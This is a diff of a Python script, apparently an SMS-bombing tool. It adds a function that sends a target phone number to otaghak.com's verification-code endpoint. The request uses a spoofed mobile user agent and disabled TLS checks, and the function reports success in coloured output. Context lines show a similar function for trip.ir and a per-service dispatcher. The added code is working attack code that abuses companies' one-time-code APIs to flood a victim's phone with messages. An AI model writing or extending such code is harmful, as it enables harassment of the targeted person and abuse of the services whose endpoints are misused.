@@ -65,6 +65,45 @@ def send_service_safe(service, phone):
 # ==========================
 
 
+
+def otaghak(phone):
+    try:
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"
+        
+        headers = {
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+            "Accept": "application/json",
+            "Content-Type": "application/json"
+        }
+        
+        payload = {
+            "userName": formatted_phone
+        }
+        
+        response = requests.post(
+            "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode",
+            json=payload,
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+        
+        print(f'{y}[Debug] otaghak Status: {response.status_code}{a}')
+        print(f'{y}[Debug] otaghak Response: {response.text}{a}')
+        
+        if response.status_code in [200, 201]:
+            print(f'{g}(otaghak) sms sent successfully!{a}')
+            return True
+        else:
+            print(f'{r}[-] otaghak error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] otaghak exception: {e}{a}')
+        return False
+
+
 def trip(phone):
     try:
         url = "https://gateway-v2.trip.ir/api/v1/totp/send-to-phone-and-email"
